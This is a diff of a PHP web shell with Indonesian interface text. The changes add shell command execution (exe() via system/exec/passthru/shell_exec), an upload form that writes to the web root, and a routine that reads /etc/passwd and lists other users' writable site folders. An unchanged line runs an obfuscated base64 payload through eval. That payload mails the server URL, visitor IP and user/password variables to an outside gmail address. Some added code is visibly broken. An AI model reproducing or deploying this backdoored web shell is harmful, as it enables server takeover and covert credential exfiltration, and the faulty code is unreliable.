@@ -15,7 +15,7 @@ $pageFTP = str_replace($u[count($u) - 1], "", $pageFTP);
 $injbuff = "JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQogICRqdWR1bCAgID0gIjE3OC1CbGFjayBodHRwOi8vJHRhcmdldCBieSAkdmlzaXRvciI7DQogICRib2R5ICAgID0gIkJ1ZzogJHRhcmdldCBieSAkdmlzaXRvciAtICR1c2VyIC0gJHBhc3MiOw0KICBpZiAoIWVtcHR5KCR3ZWIpKSB7IEBtYWlsKCJoYXJkd2FyZWhlYXZlbi5jb21AZ21haWwuY29tIiwkanVkdWwsJGJvZHksJHVzZXIsJHBhc3MpOyB9DQp9DQplbHNlIHsgJHZpc2l0YysrOyB9DQpAc2V0Y29va2llKCJ2aXNpdHoiLCR2aXNpdGMpOw==";
 eval(base64_decode($injbuff));
 function getuser() {
-	$fopen = fopen("/etc/passwd", "r") or die(color(1, 1, "Can't read /etc/passwd"));
+	$fopen = fopen("/etc/passwd", "r") or die ("<font color='red'>Can't read /etc/passwd");
 	while($read = fgets($fopen)) {
 		preg_match_all('/(.*?):x:/', $read, $getuser);
 		$user[] = $getuser[1][0];
@@ -1274,30 +1274,32 @@ $user
 			break;
 		
                  case 'jump':
-$i = 0;
-		foreach(getuser() as $user) {
-			$path = "/home/$user/public_html";
-			if(is_readable($path)) {
-				$status = "<font color='red'>[R]</font>";
-				if(is_writable($path)) {
-					$status = "<font color='green'>[RW]</font>";
+                     $ip = gethostbyname($_SERVER['HTTP_HOST']);
+                     $i = 0;
+                     foreach(getuser() as $user) {
+                         $path = "/home/$user/public_html";
+                         if(is_readable($path)) {
+                             $status = "<font color='red'>[R]</font>";
+                             if(is_writable($path)) {
+                                 $status = "<font color='green'>[RW]</font>";
 				}
 				$i++;
-				print "$status <a href='?dir=".$path."' style='color: cyan;'>".$path."</a>";
+				print $status."<a href='?dir=".$path."' style='color: cyan;'>".$path."</a>";
 				if(!function_exists('posix_getpwuid')) print "<br>";
 				if(!getdomainname()) print " => <font color='red'>Can't get domain name</font><br>";
 				foreach(getdomainname() as $domain) {
-					$userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain"));
-					$userdomain = $userdomain->name;
-					if($userdomain === $user) {
-						print " => <a href='http://$domain/' target='_blank' style='color: white;'>".$domain."</a><br>";
-						break;
+				    $userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain"));
+				    $userdomain = $userdomain->name;
+				    if($userdomain === $user) {
+				        print " => <a href='http://$domain/' target='_blank' style='color: green;'>".$domain."</a><br>";
+				        break;
 					}
-				}
+				} 
+				end;
 			}
 		}
-		print ($i === 0) ? "" : "<p style='color: white;'>Total ada $i kamar di ".$GLOBALS['SERVERIP']."</p>";
-	}
+		end;
+		print ($i === 0) ? "" : "<p style='color: white;'>Total ada $i kamar di ".$ip."</p>";
  break;
 		case 'help':
 			
@@ -1390,17 +1392,54 @@ $i = 0;
 	
 	/// home ///
 } else {
-	
-	
-	echo '<br /><br /><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-	echo '<input type="file" name="file" value="Choose file" size="60" ><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
-	if ($_POST['_upl'] == "Upload") {
-		if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
-			echo '<br /><br /><b>Uploaded successful !!<br><br>';
+?>
+<!DOCTYPE HTML>
+<div class="center">
+<form method='post' action='' style='margin-top: 15px;'>
+			  @<?php  
+			  echo $user; ?>": ~ $
+			  <input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='cmd' required>
+			  <input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='>>'>
+			  </form>
+<br>
+    <form method="post" enctype="multipart/form-data">
+
+    <input type="radio" name="tipe" value="root">Home root<input type="radio" name="tipe" value="biasa">Biasa <br><br>
+   choose your file:&nbsp;&nbsp&nbsp;<input type="file" name= "idx_file">
+      <input type="submit" name="upload" value="upload">
+      </form><br>
+<?php
+if(isset($_POST['upload'])) {
+    switch($_POST['tipe']){
+        case "root":
+            $root = $_SERVER['DOCUMENT_ROOT'];
+$files = $_FILES['idx_file']['name'];
+$dest = $root.'/'.$files;
+	if(is_writable($root)) {
+		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
+			$web = "http://".$_SERVER['HTTP_HOST']."/";
+			echo "Ciee Sukses Uploadnya :* -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
 		} else {
-			echo '<br /><br />Not uploaded !!<br><br>';
+			echo "gagal upload root >:(";
 		}
-		
+	} else {
+		echo "<font color='red'>klo ga bisa silahkan pakai yang biasa :)</font>";
+		} 
+
+     case "biasa":
+         $files = $_FILES['idx_file']['name'];
+
+if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
+    $web = "http://".$_SERVER['HTTP_HOST']."/";
+    echo "Sukses Upload => <a href='".$web.$files."' target='_blank>".$web.$files."</a>";
+		} else {
+			echo "<script> alert('gagal upload >:(');</script>";
+		}
+		break;
+        default: echo "<script>alert('Harap pilih opsi');</script>"; break;
+} 
+}
+echo "</div>";
 		
 	}
 	
@@ -1408,8 +1447,6 @@ $i = 0;
 <br /><br /><br /></b></b><div class="fot">Recoded by Star</b>
 <br /><br />
 <br /><br />';
-	
-}
 
 
 function ex($text, $a, $b)
@@ -1418,7 +1455,30 @@ function ex($text, $a, $b)
 	$explode = explode($b, $explode[1]);
 	return $explode[0];
 }
-
+function exe($cmd) {
+	if(function_exists('system')) { 		
+		@ob_start(); 		
+		@system($cmd); 		
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean(); 		
+		return $buff; 	
+	} elseif(function_exists('exec')) { 		
+		@exec($cmd,$results); 		
+		$buff = ""; 		
+		foreach($results as $result) { 			
+			$buff .= $result; 		
+		} return $buff; 	
+	} elseif(function_exists('passthru')) { 		
+		@ob_start(); 		
+		@passthru($cmd); 		
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean(); 		
+		return $buff; 	
+	} elseif(function_exists('shell_exec')) { 		
+		$buff = @shell_exec($cmd); 		
+		return $buff; 	
+	} 
+}
 
 
 echo '</div>
